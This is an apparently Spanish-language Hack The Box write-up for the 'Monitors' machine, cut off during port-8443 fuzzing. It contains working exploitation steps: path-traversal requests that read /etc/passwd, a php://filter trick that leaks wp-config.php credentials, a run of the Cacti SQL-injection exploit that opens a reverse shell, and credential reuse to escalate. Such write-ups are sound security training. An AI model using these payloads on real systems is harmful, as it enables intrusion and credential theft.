        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Monitors&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Dificil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin &lt;code&gt;spritz&lt;/code&gt; de &lt;code&gt;Wordpress&lt;/code&gt; que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de &lt;code&gt;cacti&lt;/code&gt; con una version vulnerable, seguidamente abusaremos de un ataque de &lt;code&gt;deserealizacion&lt;/code&gt; con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability &lt;code&gt;sysmodule&lt;/code&gt; para escapar del contenedor y ganar acceso a la maquina real como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Monitors
❯ ls
 Monitors
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.238
PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=108 ms

--- 10.10.10.238 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.365/108.365/108.365/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:04 GMT
Initiating SYN Stealth Scan at 21:04
Scanning 10.10.10.238 [65535 ports]
Discovered open port 22/tcp on 10.10.10.238
Discovered open port 80/tcp on 10.10.10.238
Completed SYN Stealth Scan at 21:04, 28.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.238
Host is up, received user-set (2.6s latency).
Scanned at 2023-05-14 21:04:30 GMT for 29s
Not shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
           Raw packets sent: 110162 (4.847MB) | Rcvd: 86054 (3.442MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;22 ssh&lt;/code&gt; y &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:05 GMT
Nmap scan report for monitors.htb (10.10.10.238)
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously
|_http-generator: WordPress 5.5.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de &lt;code&gt;whatweb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.238
http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Volvemos a usar &lt;code&gt;whatweb&lt;/code&gt;, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un &lt;code&gt;wordpress&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://monitors.htb
http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a abrir la pagina en nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos un articulo publicado por el usuario &lt;code&gt;admin&lt;/code&gt;, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta &lt;code&gt;wp-login.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora al tratarse de un &lt;code&gt;wordpress&lt;/code&gt; trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario &lt;code&gt;wp-plugins.fuzz.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;, enconjunto con nuestra herramienta de confianza &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://monitors.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://monitors.htb/FUZZ
Total requests: 13368

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================


Total time: 36.76465
Processed Requests: 13368
Filtered Requests: 13368
Requests/sec.: 363.6101
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;wfuzz&lt;/code&gt; no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los &lt;code&gt;plugins&lt;/code&gt; y ver si tenemos permiso para lista el directorio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos lista el contenido vemos el servicio usa &lt;code&gt;spritz&lt;/code&gt; como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit spritz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                                                          | php/webapps/44544.php
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Efectivamente tal y como nos reporta existe una vulnerabilidad asociada &lt;code&gt;Remote File Inclusion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Analizando el codigo del &lt;code&gt;exploit&lt;/code&gt; vemos que aprovecha una ruta para poder lista archivos de la maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat 44544.php

1. Version Disclosure

/wp-content/plugins/wp-with-spritz/readme.txt

2. Source Code

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

3. Proof of Concept

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a listar el &lt;code&gt;/etc/hosts&lt;/code&gt; de la maquina victima y nos lo muestra con exito.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd&quot;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como sabemos que el servicio usa &lt;code&gt;apache&lt;/code&gt;, podemos trata de listar el &lt;code&gt;000-default.conf&lt;/code&gt; y tratar de filtrar información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf&quot;
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que existe otro &lt;code&gt;subdominio&lt;/code&gt;, asi que procederemos a agregarlo tambien a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.238 cacti-admin.monitors.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora visiualizamos el servicio en el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que usa &lt;code&gt;cacti&lt;/code&gt; y con una version concreta correspondiente a la &lt;code&gt;1.2.12&lt;/code&gt; y que tiene una vulnerabilidad asociada.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cacti 1.2.12
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                | php/webapps/49810.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinando el &lt;code&gt;exploit&lt;/code&gt; vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un &lt;code&gt;usuario y contraseña'&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py
usage: cacti.py [-h] -t &amp;lt;target/host URL&amp;gt; -u &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; --lhost &amp;lt;lhost&amp;gt; --lport &amp;lt;lport&amp;gt;
cacti.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Debemos recordar que al enfrentarnos a un &lt;code&gt;wordpress&lt;/code&gt;, podemos listar el &lt;code&gt;wp-config.php&lt;/code&gt; y obtener unas credenciales validas, para ello podemos usar el &lt;code&gt;exploit spritz&lt;/code&gt; y un wraper encoding de &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php&quot; | base64 -d
&amp;lt;?php
*
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to &quot;wp-config.php&quot; and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtemos unas credenciales que justamente son validas para el servicio &lt;code&gt;cacti&lt;/code&gt;, asi que usaremos el &lt;code&gt;exploit&lt;/code&gt; con los parametros necesarios y nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10.10.16.3 --lport 443
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
&quot;name&quot;,&quot;hex&quot;
&quot;admin&quot;,&quot;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&quot;
&quot;guest&quot;,&quot;43e9a4ab75570f5b&quot;

[+] Check your nc listener!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexion como &lt;code&gt;www-data&lt;/code&gt; y estamos en la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:38574.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre vamos a conseguir una &lt;code&gt;tty&lt;/code&gt; full interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
www-data@monitors:/usr/share/cacti/cacti$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
www-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;marcus&lt;/code&gt; y vemos que aun no podemos visualizar la &lt;code&gt;flag&lt;/code&gt; como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home$ cd marcus/
www-data@monitors:/home/marcus$ ls
note.txt  user.txt
www-data@monitors:/home/marcus$ cat user.txt 
cat: user.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tenemos un servicio &lt;code&gt;cacti&lt;/code&gt; vamos a tratar de filtrar desde la raiz archivos que contengan la palabra &lt;code&gt;cacti&lt;/code&gt; y encontramos una ruta con un archivo &lt;code&gt;cacti-backup-service&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ find / -name \*cacti\* 2&amp;gt;/dev/null
/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service
/var/log/cacti-access.log
/var/log/cacti-error.log
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
/usr/share/cacti
/usr/share/cacti/cacti
/usr/share/cacti/cacti/log/cacti.log
/usr/share/cacti/cacti/locales/po/cacti.pot
/usr/share/cacti/cacti/scripts/cacti_user_stats.php
/usr/share/cacti/cacti/include/cacti_version
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo y dentro nos muestra que dentro del directorio oculto &lt;code&gt;.backup&lt;/code&gt; se encuentra un archivo &lt;code&gt;backup.sh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo &lt;code&gt;backup.sh&lt;/code&gt; y encontramos unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name=&quot;cacti_backup&quot;
config_pass=&quot;VerticalEdge2020&quot;

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p &quot;${config_pass}&quot; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos la contraseña y podemos convertirnos en el usuario &lt;code&gt;marcus&lt;/code&gt; y ahora si podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ su marcus
Password: 
marcus@monitors:~$ whoami
marcus
marcus@monitors:~$ cat /home/marcus/user.txt 
055c999cf2967582c6bd59b2cd7fd44f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso &lt;code&gt;8443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      1 10.10.10.238:59308      1.1.1.1:53              SYN_SENT   
tcp        0    138 10.10.10.238:38574      10.10.16.3:443          ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       1      0 10.10.10.238:80         10.10.16.3:38872        CLOSE_WAIT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario &lt;code&gt;marcus&lt;/code&gt; por el servicio &lt;code&gt;ssh&lt;/code&gt;, que si recordamos estaba abierto y aplicaremos un &lt;code&gt;local port forwarding&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
marcus@10.10.10.238's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 14 22:16:22 UTC 2023

  System load:  0.08               Users logged in:                0
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 46%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    189

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 14 22:13:41 2023 from 10.10.16.3
marcus@monitors:~$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verificamos que tenemos conexion al puerto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ lsof -i:8443
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     66347 root    4u  IPv6 258489      0t0  TCP localhost:8443 (LISTEN)
ssh     66347 root    5u  IPv4 258490      0t0  TCP localhost:8443 (LISTEN)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos el servicio desde nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos arroja el codigo de estado &lt;code&gt;404 not found&lt;/code&gt;. Ahora trataremos con &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://127.0.0.1:8443/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000016:   302        0 L      0 W        0 Ch        &quot;images&quot;                                                                                                              
000000075:   302        0 L      0 W        0 Ch        &quot;content&quot;                                                                                                             
